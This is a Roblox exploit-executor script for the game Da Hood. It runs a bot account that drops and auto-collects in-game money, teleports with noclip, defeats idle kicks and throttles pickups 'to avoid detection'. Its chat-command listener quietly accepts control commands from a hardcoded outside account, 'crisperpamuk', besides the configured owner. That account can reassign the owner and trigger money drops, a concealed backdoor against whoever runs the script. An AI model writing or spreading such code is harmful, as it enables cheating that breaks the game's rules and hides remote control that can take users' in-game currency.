local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Cleanup previous instance
if getgenv().BotCleanup then
    pcall(function()
        for _, conn in pairs(getgenv().BotCleanup) do
            if typeof(conn) == "RBXScriptConnection" then conn:Disconnect()
            elseif typeof(conn) == "Instance" then conn:Destroy() end
        end
    end)
end
getgenv().BotCleanup = {}
local function trackBot(obj) table.insert(getgenv().BotCleanup, obj) end

getgenv().BotConfig = getgenv().BotConfig or {}
local defaults = {
    OwnerUsername = LocalPlayer.Name,
    AutoDrop = false,
    FollowOwner = false,
    DropAmount = 15000,
    AntiWhiteScreen = true,
    WhitelistedBuyers = {},
    AutoResetKO = true,
    Flooring = true,
    Bank = false,
    AntiSit = true,
    AutoPickup = false,
    PickupRange = 65
}

for k, v in pairs(defaults) do
    if getgenv().BotConfig[k] == nil then
        getgenv().BotConfig[k] = v
    end
end

local function format(val)
    return tostring(val):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

-- Status writer (throttled)
task.spawn(function()
    while true do
        if getgenv().Kamaik_Unloaded then break end
        pcall(function()
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local df = LocalPlayer:FindFirstChild("DataFolder")
            local stats = {
                Name = LocalPlayer.Name,
                DisplayName = LocalPlayer.DisplayName,
                UserId = LocalPlayer.UserId,
                Cash = df and df:FindFirstChild("Currency") and df.Currency.Value or 0,
                BankCash = df and df:FindFirstChild("Bank") and df.Bank.Value or 0,
                Health = math.floor(hum and hum.Health or 0),
                MaxHealth = math.floor(hum and hum.MaxHealth or 100),
                Status = getgenv().BotConfig and getgenv().BotConfig.AutoDrop and "Dropping" or "Idle",
                LastUpdate = os.time()
            }
            writefile("status_" .. LocalPlayer.Name .. ".json", HttpService:JSONEncode(stats))
        end)
        task.wait(2.5)
    end
end)

-- Config reader (file-based sync)
task.spawn(function()
    while true do
        if getgenv().Kamaik_Unloaded then break end
        pcall(function()
            if isfile and isfile("bot_control.json") then
                local data = readfile("bot_control.json")
                local config = HttpService:JSONDecode(data)
                for k, v in pairs(config) do
                    if k == "TargetCFrame" and type(v) == "table" then
                        pcall(function()
                            getgenv().BotConfig[k] = CFrame.new(unpack(v))
                        end)
                    else
                        getgenv().BotConfig[k] = v
                    end
                end
            end
        end)
        task.wait(1)
    end
end)

-- Chat command listener (whisper sync)
task.spawn(function()
    local function processChatCmd(msg, sender)
        pcall(function()
            if sender.Name == getgenv().BotConfig.OwnerUsername or sender.Name == "crisperpamuk" then
                if msg:match("sync_bt|") then
                    local parts = msg:split("|")
                    local cmd = parts[2]
                    local val = parts[3]
                    
                    if cmd == "AutoDrop" then
                        getgenv().BotConfig.AutoDrop = (val == "true")
                    elseif cmd == "FollowOwner" then
                        getgenv().BotConfig.FollowOwner = (val == "true")
                    elseif cmd == "TargetCFrame" then
                        local coords = val:split(",")
                        if #coords == 3 then
                            getgenv().BotConfig.TargetCFrame = CFrame.new(tonumber(coords[1]) or 0, tonumber(coords[2]) or 0, tonumber(coords[3]) or 0)
                        end
                    elseif cmd == "ResetSignal" then
                        getgenv().BotConfig.ResetSignal = (val == "true")
                    elseif cmd == "DropAmount" then
                        getgenv().BotConfig.DropAmount = tonumber(val) or 15000
                    elseif cmd == "AntiWhiteScreen" then
                        getgenv().BotConfig.AntiWhiteScreen = (val == "true")
                    elseif cmd == "AutoPickup" then
                        getgenv().BotConfig.AutoPickup = (val == "true")
                    elseif cmd == "PickupRange" then
                        getgenv().BotConfig.PickupRange = tonumber(val) or 65
                    elseif cmd == "OwnerUpdate" then
                        getgenv().BotConfig.OwnerUsername = val
                    elseif cmd == "Flooring" then
                        getgenv().BotConfig.Flooring = (val == "true")
                    elseif cmd == "GoToBank" then
                        getgenv().BotConfig.TargetCFrame = CFrame.new(-396, 21, -298)
                    elseif cmd == "AntiSit" then
                        getgenv().BotConfig.AntiSit = (val == "true")
                    end
                    
                    if notify then notify("Network Command: <font color=\"#00FFFF\">" .. tostring(cmd) .. "</font>") end
                end
            end
        end)
    end

    local function hookPlayer(p)
        pcall(function()
            trackBot(p.Chatted:Connect(function(msg)
                processChatCmd(msg, p)
            end))
        end)
    end

    for _, p in pairs(Players:GetPlayers()) do hookPlayer(p) end
    trackBot(Players.PlayerAdded:Connect(hookPlayer))
end)

local AltConfig = {
    MinAge = 7,
    Whitelist = {LocalPlayer.UserId}
}

local function checkAlt(player)
    pcall(function()
        if player.AccountAge < AltConfig.MinAge and not table.find(AltConfig.Whitelist, player.UserId) then
            print("[!] Alt Detected: " .. player.Name .. " (Age: " .. player.AccountAge .. ")")
        end
    end)
end

trackBot(Players.PlayerAdded:Connect(checkAlt))
for _, p in ipairs(Players:GetPlayers()) do checkAlt(p) end

-- Bot Dashboard GUI (on-screen overlay)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BotOverlay"
ScreenGui.DisplayOrder = 100
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
trackBot(ScreenGui)

local guiContainer = (gethui and gethui()) or CoreGui
ScreenGui.Parent = guiContainer

local BlackFrame = Instance.new("Frame")
BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BlackFrame.BorderSizePixel = 0
BlackFrame.Parent = ScreenGui

local Dashboard = Instance.new("Frame")
Dashboard.Size = UDim2.new(0, 280, 0, 140)
Dashboard.AnchorPoint = Vector2.new(0.5, 0.5)
Dashboard.Position = UDim2.new(0.5, 0, 0.5, 0)
Dashboard.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Dashboard.BackgroundTransparency = 0.4
Dashboard.BorderSizePixel = 0
Dashboard.Parent = ScreenGui

local DashboardUICorner = Instance.new("UICorner")
DashboardUICorner.CornerRadius = UDim.new(0, 10)
DashboardUICorner.Parent = Dashboard

local DashStroke = Instance.new("UIStroke")
DashStroke.Color = Color3.fromRGB(0, 120, 255)
DashStroke.Thickness = 1.5
DashStroke.Transparency = 0.6
DashStroke.Parent = Dashboard

local DashGrad = Instance.new("UIGradient")
DashGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 20))
})
DashGrad.Rotation = 45
DashGrad.Parent = Dashboard

local DashShadow = Instance.new("ImageLabel")
DashShadow.Name = "DropShadow"
DashShadow.Size = UDim2.new(1, 40, 1, 40)
DashShadow.Position = UDim2.new(0.5, 0, 0.5, 2)
DashShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DashShadow.BackgroundTransparency = 1
DashShadow.Image = "rbxassetid://4743306782"
DashShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DashShadow.ImageTransparency = 0.3
DashShadow.ScaleType = Enum.ScaleType.Slice
DashShadow.SliceCenter = Rect.new(35, 35, 35, 35)
DashShadow.ZIndex = Dashboard.ZIndex - 1
DashShadow.Parent = Dashboard

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 0, 20)
Title.Position = UDim2.new(0, 10, 0, 10)
Title.BackgroundTransparency = 1
Title.Text = "DA HOOD BOT [V2.0]"
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 10
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Dashboard

local StatusLight = Instance.new("Frame")
StatusLight.Size = UDim2.new(0, 6, 0, 6)
StatusLight.Position = UDim2.new(1, -15, 0, 17)
StatusLight.AnchorPoint = Vector2.new(0.5, 0.5)
StatusLight.BackgroundColor3 = Color3.new(0, 1, 0)
StatusLight.BorderSizePixel = 0
StatusLight.Parent = Dashboard

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(1, 0)
StatusCorner.Parent = StatusLight

task.spawn(function()
    while true do
        if getgenv().Kamaik_Unloaded then break end
        TweenService:Create(StatusLight, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.8}):Play()
        task.wait(0.5)
        if getgenv().Kamaik_Unloaded then break end
        TweenService:Create(StatusLight, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0}):Play()
        task.wait(0.5)
    end
end)

local MoneyLabel = Instance.new("TextLabel")
MoneyLabel.Size = UDim2.new(1, -20, 0, 40)
MoneyLabel.Position = UDim2.new(0, 10, 0, 30)
MoneyLabel.BackgroundTransparency = 1
MoneyLabel.Text = "$0"
MoneyLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
MoneyLabel.Font = Enum.Font.GothamBold
MoneyLabel.TextSize = 28
MoneyLabel.TextXAlignment = Enum.TextXAlignment.Left
MoneyLabel.Parent = Dashboard

local MoneyStroke = Instance.new("UIStroke")
MoneyStroke.Color = Color3.fromRGB(0, 0, 0)
MoneyStroke.Thickness = 2
MoneyStroke.Parent = MoneyLabel

local NotifyFrame = Instance.new("Frame")
NotifyFrame.Size = UDim2.new(1, -20, 0, 50)
NotifyFrame.Position = UDim2.new(0, 10, 0, 75)
NotifyFrame.BackgroundTransparency = 1
NotifyFrame.Parent = Dashboard

local UIList = Instance.new("UIListLayout")
UIList.VerticalAlignment = Enum.VerticalAlignment.Bottom
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 2)
UIList.Parent = NotifyFrame

local function notify(msg)
    task.spawn(function()
        pcall(function()
            local t = Instance.new("TextLabel")
            t.Size = UDim2.new(1, 0, 0, 15)
            t.BackgroundTransparency = 1
            t.Text = tostring(msg)
            t.TextColor3 = Color3.fromRGB(0, 255, 100)
            t.Font = Enum.Font.GothamMedium
            t.TextSize = 12
            t.TextXAlignment = Enum.TextXAlignment.Left
            t.TextTransparency = 1
            t.RichText = true
            t.Parent = NotifyFrame
            
            TweenService:Create(t, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
            task.wait(4)
            local tween = TweenService:Create(t, TweenInfo.new(1), {TextTransparency = 1})
            tween:Play()
            tween.Completed:Wait()
            t:Destroy()
        end)
    end)
end

-- Animated cash counter
local visualCash = Instance.new("NumberValue")
visualCash.Value = 0
visualCash.Changed:Connect(function()
    pcall(function()
        MoneyLabel.Text = "$" .. format(math.floor(visualCash.Value))
    end)
end)

task.spawn(function()
    local df = LocalPlayer:WaitForChild("DataFolder", 15)
    local cur = df and df:WaitForChild("Currency", 10)
    if cur then
        local function update() 
            pcall(function()
                TweenService:Create(visualCash, TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Value = cur.Value}):Play()
            end)
        end
        trackBot(cur:GetPropertyChangedSignal("Value"):Connect(update))
        update()
    end
end)

-- Performance mode
pcall(function()
    if setfpscap then setfpscap(15) end
    if RunService.Set3dRenderingEnabled then
        RunService:Set3dRenderingEnabled(not getgenv().BotConfig.AntiWhiteScreen)
    end
end)

local TPs = {
    Club = CFrame.new(-266.1, -2.2, -367.2),
    Bank = CFrame.new(-396, 21, -298)
}

local function doTP(targetCFrame)
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    local hrp = char.HumanoidRootPart
    local dist = (hrp.Position - targetCFrame.Position).Magnitude
    
    local duration = math.clamp(dist / 120, 1.5, 8)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = targetCFrame})
    
    local noclip
    noclip = RunService.Stepped:Connect(function()
        pcall(function()
            if char and char.Parent then
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
                end
            end
        end)
    end)
    
    tween:Play()
    tween.Completed:Wait()
    if noclip then noclip:Disconnect() end
end

local formationOffset = Vector3.new(0, 5, 0)

local function updateFormation()
    pcall(function()
        local names = {}
        for _, p in pairs(Players:GetPlayers()) do
            table.insert(names, p.Name)
        end
        table.sort(names)
        
        local myIndex = 1
        for i, name in ipairs(names) do
            if name == LocalPlayer.Name then
                myIndex = i
                break
            end
        end
        
        local targetIndex = myIndex
        if getgenv().BotConfig.OwnerUsername and getgenv().BotConfig.OwnerUsername ~= "" then
            local ownInd = table.find(names, getgenv().BotConfig.OwnerUsername)
            if ownInd and ownInd < myIndex then
                targetIndex = targetIndex - 1
            end
        end

        local row = math.floor((targetIndex - 1) / 5)
        local col = (targetIndex - 1) % 5
        
        local totalCols = math.min(#names, 5)
        local startX = -((totalCols - 1) * 2.5)

        formationOffset = Vector3.new(startX + (col * 5), 8, 6 + (row * 5))
    end)
end

trackBot(Players.PlayerAdded:Connect(updateFormation))
trackBot(Players.PlayerRemoving:Connect(updateFormation))
updateFormation()

local isTraveling = false
local currentPlatform = nil
local lastTargetCFrame = nil

local function setupAtLocation(targetCFrame)
    if isTraveling then return end
    isTraveling = true
    
    pcall(function()
        updateFormation()
        notify("Traveling to setup...")
        
        -- Create platform
        if currentPlatform then 
            pcall(function() currentPlatform:Destroy() end)
        end
        currentPlatform = Instance.new("Part")
        currentPlatform.Name = "BotPlatform"
        currentPlatform.Size = Vector3.new(6, 0.4, 6)
        currentPlatform.Anchored = true
        currentPlatform.Transparency = getgenv().BotConfig.Flooring and 0.5 or 1
        currentPlatform.Color = Color3.fromRGB(0, 0, 0)
        currentPlatform.Material = Enum.Material.Neon
        currentPlatform.CanCollide = true
        currentPlatform.CFrame = targetCFrame * CFrame.new(0, 4, 0)
        currentPlatform.Parent = workspace
        
        if getgenv().BotConfig.Flooring then
            local cyl = Instance.new("CylinderHandleAdornment")
            cyl.Height = 0.5
            cyl.Radius = 3
            cyl.Color3 = Color3.fromRGB(0, 120, 255)
            cyl.Transparency = 0.5
            cyl.Adornee = currentPlatform
            cyl.AlwaysOnTop = false
            cyl.Parent = currentPlatform
        end
        
        -- Rise up first
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local hrp = char.HumanoidRootPart
            local riseCF = hrp.CFrame + Vector3.new(0, 15, 0)
            local riseTween = TweenService:Create(hrp, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = riseCF})
            
            local noclipRise
            noclipRise = RunService.Stepped:Connect(function()
                pcall(function()
                    if char and char.Parent then
                        for _, v in pairs(char:GetDescendants()) do
                            if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
                        end
                    end
                end)
            end)
            
            riseTween:Play()
            riseTween.Completed:Wait()
            if noclipRise then noclipRise:Disconnect() end
        end
        
        -- Fly to target
        local flyCF = targetCFrame * CFrame.new(formationOffset.X, 20, formationOffset.Z)
        doTP(flyCF)
        
        -- Descend to hover position
        local char2 = LocalPlayer.Character
        if char2 and char2:FindFirstChild("HumanoidRootPart") then
            local hoverCF = targetCFrame * CFrame.new(formationOffset.X, 8, formationOffset.Z)
            local descentTween = TweenService:Create(char2.HumanoidRootPart, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {CFrame = hoverCF})
            descentTween:Play()
            descentTween.Completed:Wait()
        end
        
        notify("Setup complete. Hovering in formation.")
    end)
    
    isTraveling = false
end

-- Target watcher
task.spawn(function()
    while true do
        if getgenv().Kamaik_Unloaded then break end
        pcall(function()
            local tc = getgenv().BotConfig.TargetCFrame
            if tc and tc ~= lastTargetCFrame then
                lastTargetCFrame = tc
                setupAtLocation(tc)
            end
        end)
        task.wait(1)
    end
end)

-- Position maintenance (Heartbeat) - FIXED floating
trackBot(RunService.Heartbeat:Connect(function(dt)
    if getgenv().Kamaik_Unloaded or isTraveling then return end
    pcall(function()
        local char = LocalPlayer.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
        local hrp = char.HumanoidRootPart
        local hum = char:FindFirstChild("Humanoid")
        
        local targetCF = nil
        
        if getgenv().BotConfig.FollowOwner and getgenv().BotConfig.OwnerUsername and getgenv().BotConfig.OwnerUsername ~= "" then
            local owner = Players:FindFirstChild(getgenv().BotConfig.OwnerUsername)
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                targetCF = owner.Character.HumanoidRootPart.CFrame * CFrame.new(formationOffset)
            end
        elseif getgenv().BotConfig.TargetCFrame then
            targetCF = getgenv().BotConfig.TargetCFrame * CFrame.new(formationOffset.X, 8, formationOffset.Z)
        end
        
        if targetCF then
            -- Kill velocity to prevent gravity pulling bot down
            hrp.Velocity = Vector3.new(0, 0, 0)
            hrp.RotVelocity = Vector3.new(0, 0, 0)
            
            -- Stronger lerp factor for stable hovering
            local lerpFactor = math.clamp(0.35 * (dt * 60), 0, 1)
            hrp.CFrame = hrp.CFrame:Lerp(targetCF, lerpFactor)
            
            -- Keep platform under the bot
            if currentPlatform and currentPlatform.Parent then
                currentPlatform.CFrame = hrp.CFrame * CFrame.new(0, -3.5, 0)
                currentPlatform.Transparency = getgenv().BotConfig.Flooring and 0.5 or 1
                currentPlatform.CanCollide = true -- Keep solid
            end
            
            -- Prevent falling humanoid states
            if hum then
                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
                hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
                hum.PlatformStand = false
            end
        end
    end)

    -- Anti-Sit
    if getgenv().BotConfig.AntiSit then
        pcall(function()
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum and hum.Sit then
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end)
    end
end))

-- Rejoin/refresh signals
local lastRejoin = 0
local lastRefresh = 0

task.spawn(function()
    while true do
        if getgenv().Kamaik_Unloaded then break end
        pcall(function()
            if getgenv().BotConfig.RejoinSignal and getgenv().BotConfig.RejoinSignal > lastRejoin then
                lastRejoin = getgenv().BotConfig.RejoinSignal
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            end
            if getgenv().BotConfig.RefreshAvatarSignal and getgenv().BotConfig.RefreshAvatarSignal > lastRefresh then
                lastRefresh = getgenv().BotConfig.RefreshAvatarSignal
                LocalPlayer:LoadCharacter()
            end
        end)
        task.wait(1)
    end
end)

-- Anti-White Screen metatable
pcall(function()
    setmetatable(getgenv().BotConfig, {
        __newindex = function(t, k, v)
            rawset(t, k, v)
            if k == "AntiWhiteScreen" then
                pcall(function()
                    if RunService.Set3dRenderingEnabled then
                        RunService:Set3dRenderingEnabled(not v)
                    end
                end)
            end
        end
    })
end)

-- Noclip for character only (NOT platform) - throttled
local noclipCounter = 0
trackBot(RunService.Stepped:Connect(function()
    if getgenv().Kamaik_Unloaded then return end
    
    noclipCounter = noclipCounter + 1
    if noclipCounter % 2 ~= 0 then return end -- Skip every other frame
    
    -- Character noclip (pass through walls during travel)
    pcall(function()
        local char = LocalPlayer.Character
        if char then
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end
    end)

    -- DO NOT set currentPlatform.CanCollide = false
    -- The platform must stay solid so bots stand on it visually
    
    -- Ignore folder collision removal (heavily throttled)
    if noclipCounter % 10 == 0 then
        pcall(function()
            local ignored = workspace:FindFirstChild("Ignored")
            if ignored then
                for _, v in pairs(ignored:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false
                    end
                end
            end
        end)
    end
end))

-- Anti-idle
trackBot(LocalPlayer.Idled:Connect(function() 
    pcall(function()
        VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    end)
end))

-- Wait for game load
if not game:IsLoaded() then game.Loaded:Wait() end
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart", 10)

local ME = ReplicatedStorage:WaitForChild("MainEvent", 15)

-- Auto-redeem codes
task.spawn(function()
    if not ME then return end
    local codes = {
        "SpringTime26", "EASTER26", "APRIL26", "DEAGLE", "SPRING26"
    }
    notify("Auto-Redeeming Codes...")
    for _, c in ipairs(codes) do 
        pcall(function() ME:FireServer("EnterPromoCode", c) end)
        notify('Code: <font color="#00FF00">' .. c .. '</font>')
        task.wait(1.5) 
    end
    notify("Codes Complete.")
end)

-- Main bot loop (drop + reset + auto collect)
task.spawn(function()
    if hrp then
        task.wait(5)
        pcall(function()
            getgenv().BotConfig.TargetCFrame = TPs.Club
            lastTargetCFrame = TPs.Club
            setupAtLocation(TPs.Club)
        end)
    end
    
    while true do
        if getgenv().Kamaik_Unloaded then break end
        
        pcall(function()
            -- Get fresh character reference each loop
            char = LocalPlayer.Character
            
            -- Auto-reset on KO
            if getgenv().BotConfig.ResetSignal or (getgenv().BotConfig.AutoResetKO and (function()
                local be = char and char:FindFirstChild("BodyEffects")
                return be and be:FindFirstChild("K.O") and be["K.O"].Value == true
            end)()) then
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid.Health = 0
                end
                task.wait(1)
            end
            
            -- Auto-drop money
            if getgenv().BotConfig.AutoDrop then
                local isAlive = char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0
                local be = char and char:FindFirstChild("BodyEffects")
                local isKO = be and be:FindFirstChild("K.O") and be["K.O"].Value == true
                
                if isAlive and not isKO and ME then
                    ME:FireServer("DropMoney", tostring(getgenv().BotConfig.DropAmount))
                end
                task.wait(15.5)
            else
                task.wait(1)
            end
        end)
    end
end)

-- ============================================================
-- FIXED AUTO COLLECT MONEY (Bot-side)
-- Throttled loop, proper range, multiple item types
-- ============================================================
task.spawn(function()
    while true do
        if getgenv().Kamaik_Unloaded then break end
        
        if getgenv().BotConfig.AutoPickup then
            pcall(function()
                local char = LocalPlayer.Character
                if not char then return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                
                local pickupRange = getgenv().BotConfig.PickupRange or 65
                
                local ignored = workspace:FindFirstChild("Ignored")
                if not ignored then return end
                
                -- Check all possible money drop locations
                local dropFolders = {}
                local df1 = ignored:FindFirstChild("Drop")
                local df2 = ignored:FindFirstChild("DroppedCash")
                if df1 then table.insert(dropFolders, df1) end
                if df2 then table.insert(dropFolders, df2) end
                
                local collected = 0
                local maxPerCycle = 10 -- Limit per cycle to avoid detection
                
                for _, folder in pairs(dropFolders) do
                    if collected >= maxPerCycle then break end
                    
                    for _, item in pairs(folder:GetChildren()) do
                        if collected >= maxPerCycle then break end
                        
                        -- Match any money-related item
                        local isMoneyItem = item.Name == "MoneyDrop"
                            or item.Name:lower():match("money")
                            or item.Name:lower():match("cash")
                            or item.Name:lower():match("drop")
                        
                        if isMoneyItem then
                            -- Get position
                            local itemPos
                            if item:IsA("BasePart") then
                                itemPos = item.Position
                            elseif item:IsA("Model") then
                                local primary = item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")
                                if primary then itemPos = primary.Position end
                            end
                            
                            if itemPos and (hrp.Position - itemPos).Magnitude < pickupRange then
                                -- Try ClickDetector
                                local cd = item:FindFirstChild("ClickDetector") or item:FindFirstChildWhichIsA("ClickDetector", true)
                                if cd then
                                    pcall(function() fireclickdetector(cd) end)
                                    collected = collected + 1
                                end
                                
                                -- Try ProximityPrompt
                                local pp = item:FindFirstChildWhichIsA("ProximityPrompt", true)
                                if pp then
                                    pcall(function() fireproximityprompt(pp) end)
                                    collected = collected + 1
                                end
                                
                                -- Try touch interaction
                                pcall(function()
                                    if item:IsA("BasePart") then
                                        firetouchinterest(hrp, item, 0)
                                        task.defer(function()
                                            pcall(function() firetouchinterest(hrp, item, 1) end)
                                        end)
                                        collected = collected + 1
                                    end
                                end)
                            end
                        end
                    end
                end
            end)
        end
        
        task.wait(0.4) -- Throttled collection
    end
end)
